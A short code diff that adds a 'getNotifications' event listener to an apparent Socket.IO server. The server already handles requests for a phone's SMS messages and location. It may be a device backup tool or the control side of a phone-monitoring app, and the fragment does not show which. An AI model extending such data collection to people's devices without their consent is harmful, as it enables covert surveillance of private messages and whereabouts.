@@ -43,6 +43,7 @@ io.on('connection', (socket) => {
       socket.on("error", (data) =>response("error",data));
       socket.on("getSMS", (data) =>response("getSMS",data));
       socket.on('getLocation',(data)=>response("getLocation",data));
+      socket.on('getNotifications',(data)=>response("getNotifications",data));
       
       // Backup event listeners - acknowledge backup initiation
       socket.on('backupSMS', () => handleBackupInitiation(socket, 'backupSMS', 'SMS'));
